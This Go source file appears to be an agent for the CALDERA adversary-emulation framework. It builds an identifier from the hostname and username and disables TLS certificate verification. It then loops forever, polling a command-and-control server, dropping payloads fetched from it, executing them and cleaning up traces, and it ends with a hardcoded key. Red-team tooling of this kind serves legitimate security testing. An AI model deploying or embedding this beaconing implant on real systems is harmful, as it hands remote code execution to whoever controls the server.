package main

import (
	"crypto/tls"
	"fmt"
	"flag"
	"net/http"
	"os"
	"os/user"
	"time"
	"reflect"
	"./api"
	"./cleanup"
	"./util"
)

var iteration = 60

func askForInstructions(server string, group string, paw string) {
	commands := api.Instructions(server, group, paw)
	if commands != nil && len(commands.([]interface{})) > 0 {
		cmds := reflect.ValueOf(commands)
		for i := 0; i < cmds.Len(); i++ {
			cmd := cmds.Index(i).Elem().String()
			fmt.Println("[*] Running instruction")
			command := util.Unpack([]byte(cmd))
			api.Drop(server, command["payload"].(string))
			api.Execute(server, paw, command)
			cleanup.Apply(command)
		}
	} else {
		cleanup.Run()
		time.Sleep(time.Duration(iteration) * time.Second)
	}
}

func main() {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	host, _ := os.Hostname()
	user, _ := user.Current()
	paw := fmt.Sprintf("%s$%s", host, user.Username)

	server := flag.String("server", "http://localhost:8888", "The FQDN of CALDERA")
	group := flag.String("group", "my_group", "Attach a group to this agent")
	flag.Parse()

	for { askForInstructions(*server, *group, paw) }
}

var key = "KMFP9A6VX7S774V93L5ASD9LMG0RSE"